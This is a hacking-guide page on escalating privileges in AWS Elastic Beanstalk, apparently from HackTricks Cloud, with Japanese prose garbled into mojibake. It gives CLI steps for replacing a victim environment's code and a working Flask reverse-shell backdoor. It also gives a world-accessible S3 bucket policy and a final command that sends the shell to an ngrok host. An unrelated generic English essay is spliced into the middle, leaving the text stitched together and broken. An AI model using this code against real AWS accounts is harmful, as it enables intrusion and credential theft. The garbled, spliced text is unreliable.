# AWS - Elastic Beanstalk ç‰¹æ¨©ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## Elastic Beanstalk

**Elastic Beanstalkã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±**ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Beanstalkã§æ©Ÿå¯†æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€**ã•ã¾ã–ã¾ãªã‚µãƒ¼ãƒ“ã‚¹ã§å¤šãã®æ©Ÿå¯†æ¨©é™**ãŒå¿…è¦ã§ã™ã€‚ä¾‹ãˆã°ã€**`arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk`**ã«ä¸ãˆã‚‰ã‚Œã‚‹æ¨©é™ã‚’ç¢ºèªã§ãã¾ã™ã€‚
{% endhint %}

### `elasticbeanstalk:RebuildEnvironment`ã€S3æ›¸ãè¾¼ã¿æ¨©é™ãªã©

**ç’°å¢ƒã®ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚€S3ãƒã‚±ãƒƒãƒˆã«æ›¸ãè¾¼ã¿æ¨©é™**ã¨ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’**å†æ§‹ç¯‰**ã™ã‚‹ãŸã‚ã®æ¨©é™ï¼ˆ`elasticbeanstalk:RebuildEnvironment`ãŠã‚ˆã³`S3`ã€`EC2`ã€`Cloudformation`ã«é–¢é€£ã™ã‚‹ä»–ã®æ¨©é™ãŒå¿…è¦ã§ã™ï¼‰ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´**ã—ã€ã‚¢ãƒ—ãƒªã‚’å†æ§‹ç¯‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡å›ã‚¢ãƒ—ãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€æ–°ã—ã„ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã€æ”»æ’ƒè€…ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ãã‚Œã«é–¢é€£ã™ã‚‹IAMãƒ­ãƒ¼ãƒ«ã®è³‡æ ¼æƒ…å ±ã‚’å±é™ºã«ã•ã‚‰ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Create folder
mkdir elasticbeanstalk-eu-west-1-947247140022
cd elasticbeanstalk-eu-west-1-947247140022
# Download code
aws s3 sync s3://elasticbeanstalk-eu-west-1-947247140022 .
# Change code
unzip 1692777270420-aws-flask-app.zip
zip 1692777270420-aws-flask-app.zip <files to zip>
# Upload code
aws s3 cp 1692777270420-aws-flask-app.zip s3://elasticbeanstalk-eu-west-1-947247140022/1692777270420-aws-flask-app.zip
# Rebuild env
aws rebuild-environment --environment-name "env-name"
```
{% endcode %}

### `elasticbeanstalk:CreateApplication`,  `elasticbeanstalk:CreateEnvironment`, `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `iam:PassRole`ãªã©...

ä¸Šè¨˜ã®æ¨©é™ã«åŠ ãˆã¦ã€**`S3`**ã€**`EC2`**ã€**`cloudformation`**ã€**`autoscaling`**ã€**`elasticloadbalancing`**ã®æ¨©é™ãŒå¿…è¦ã§ã™ã€‚ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã¤ã“ã¨ã§ã€Elastic Beanstalkã®ã‚·ãƒŠãƒªã‚ªã‚’ã‚¼ãƒ­ã‹ã‚‰ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* AWS Elastic Beanstalkã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ä½œæˆï¼š
```bash
aws elasticbeanstalk create-application --application-name MyApp
```
* AWS Elastic Beanstalkç’°å¢ƒã‚’ä½œæˆã—ã¾ã™ï¼ˆ[**ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ **](https://docs.aws.amazon.com/elasticbeanstalk/latest/platforms/platforms-supported.html#platforms-supported.python)ï¼‰ï¼š

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk create-environment --application-name MyApp --environment-name MyEnv --solution-stack-name "64bit Amazon Linux 2 v3.4.2 running Python 3.8" --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=aws-elasticbeanstalk-ec2-role
```
{% endcode %}

ç’°å¢ƒãŒæ—¢ã«ä½œæˆã•ã‚Œã¦ãŠã‚Šã€æ–°ã—ã„ç’°å¢ƒã‚’ä½œæˆã—ãŸããªã„å ´åˆã¯ã€æ—¢å­˜ã®ç’°å¢ƒã‚’å˜ã«æ›´æ–°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ¼ãƒ‰ã¨ä¾å­˜é–¢ä¿‚ã‚’ZIPãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸åŒ–ã—ã¾ã™ï¼š
```python
zip -r MyApp.zip .
```
* S3ãƒã‚±ãƒƒãƒˆã«ZIPãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ï¼š
```python
aws s3 cp MyApp.zip s3://elasticbeanstalk-<region>-<accId>/MyApp.zip
```
* AWS Elastic Beanstalkã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ä½œæˆ:

{% code overflow="wrap" %}
```css
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-1.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="MyApp.zip"
```
{% endcode %}

* AWS Elastic Beanstalkç’°å¢ƒã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã—ã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0
```
{% endcode %}

### `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `cloudformation:GetTemplate`, `cloudformation:DescribeStackResources`, `cloudformation:DescribeStackResource`, `autoscaling:DescribeAutoScalingGroups`, `autoscaling:SuspendProcesses`, `autoscaling:SuspendProcesses`

ã¾ãšã€**å‰ã®æ‰‹é †**ã«å¾“ã£ã¦ã€**è¢«å®³è€…**ã§å®Ÿè¡Œã—ãŸã„**ã‚³ãƒ¼ãƒ‰**ã‚’å«ã‚€**æ­£è¦ã®Beanstalkç’°å¢ƒ**ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãŠãã‚‰ãã€ã“ã‚Œã‚‰ã®**2ã¤ã®ãƒ•ã‚¡ã‚¤ãƒ«**ã‚’å«ã‚€å˜ç´”ãª**zip**ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚

{% tabs %}
{% tab title="application.py" %}
```python
from flask import Flask, request, jsonify
import subprocess,os, socket

application = Flask(__name__)

@application.errorhandler(404)
def page_not_found(e):
return jsonify('404')

@application.route("/")
def index():
return jsonify('Welcome!')


@application.route("/get_shell")
def search():
host=request.args.get('host')
port=request.args.get('port')
if host and port:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,int(port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
return jsonify('done')

if __name__=="__main__":
application.run()
```
{% tab title="requirements.txt" %}
```
click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
Werkzeug==1.0.1
```
{% endtab %}
{% endtabs %}

è‡ªåˆ†ã®Beanstalkç’°å¢ƒã§rev shellã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹å ´åˆã€ãã‚Œã‚’è¢«å®³è€…ã®ç’°å¢ƒã«ç§»è¡Œã™ã‚‹æ™‚ãŒæ¥ã¾ã—ãŸã€‚ãã®ãŸã‚ã«ã¯ã€Beanstalkã®S3ãƒã‚±ãƒƒãƒˆã®Bucket Policyã‚’æ›´æ–°ã—ã¦ã€è¢«å®³è€…ãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆæ³¨æ„ï¼šã“ã‚Œã«ã‚ˆã‚Šãƒã‚±ãƒƒãƒˆã¯ã€Œèª°ã§ã‚‚ã€ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼‰ã€‚
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "eb-af163bf3-d27b-4712-b795-d1e33e331ca4",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"s3:ListBucket",
"s3:ListBucketVersions",
"s3:GetObject",
"s3:GetObjectVersion",
"s3:*"
],
"Resource": [
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022",
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022/*"
]
},
{
"Sid": "eb-58950a8c-feb6-11e2-89e0-0800277d041b",
"Effect": "Deny",
"Principal": {
"AWS": "*"
},
"Action": "s3:DeleteBucket",
"Resource": "arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022"
}
]
}
```
# AWS Elastic Beanstalk Privilege Escalation

## Introduction

AWS Elastic Beanstalk is a fully managed service that makes it easy to deploy and run applications in multiple languages. However, misconfigurations in Elastic Beanstalk environments can lead to privilege escalation vulnerabilities.

## Exploiting Privilege Escalation Vulnerabilities

### 1. Environment Variables

#### Description

Environment variables in Elastic Beanstalk can be used to store sensitive information such as API keys, database credentials, and other secrets. If these variables are not properly protected, an attacker can escalate their privileges by accessing and abusing them.

#### Exploitation

1. Identify the Elastic Beanstalk environment and its associated application.
2. Use the AWS Management Console or AWS CLI to access the environment's configuration.
3. Look for environment variables that may contain sensitive information.
4. If any environment variables are found, attempt to access and abuse them to escalate privileges.

### 2. IAM Roles and Policies

#### Description

IAM roles and policies in Elastic Beanstalk define the permissions and access controls for the environment and its associated resources. Misconfigurations in these roles and policies can allow an attacker to escalate their privileges.

#### Exploitation

1. Identify the Elastic Beanstalk environment and its associated application.
2. Use the AWS Management Console or AWS CLI to access the environment's configuration.
3. Look for IAM roles and policies that may have excessive permissions or misconfigurations.
4. If any misconfigurations are found, attempt to exploit them to escalate privileges.

### 3. Instance Profiles

#### Description

Instance profiles in Elastic Beanstalk define the IAM role that is associated with the EC2 instances running in the environment. If an instance profile has excessive permissions or misconfigurations, an attacker can escalate their privileges.

#### Exploitation

1. Identify the Elastic Beanstalk environment and its associated application.
2. Use the AWS Management Console or AWS CLI to access the environment's configuration.
3. Look for instance profiles that may have excessive permissions or misconfigurations.
4. If any misconfigurations are found, attempt to exploit them to escalate privileges.

## Conclusion

Privilege escalation vulnerabilities in AWS Elastic Beanstalk can be exploited by attackers to gain unauthorized access and control over the environment and its resources. It is important to regularly review and secure the configuration of Elastic Beanstalk environments to mitigate these risks.
```bash
# Use a new --version-label
# Use the bucket from your own account
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-2.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="revshell.zip"

# These step needs the extra permissions
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0

# To get your rev shell just access the exposed web URL with params such as:
http://myenv.eba-ankaia7k.us-east-1.elasticbeanstalk.com/get_shell?host=0.tcp.eu.ngrok.io&port=13528
```
{% endcode %}

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **ä¼šç¤¾ã‚’ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã§å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
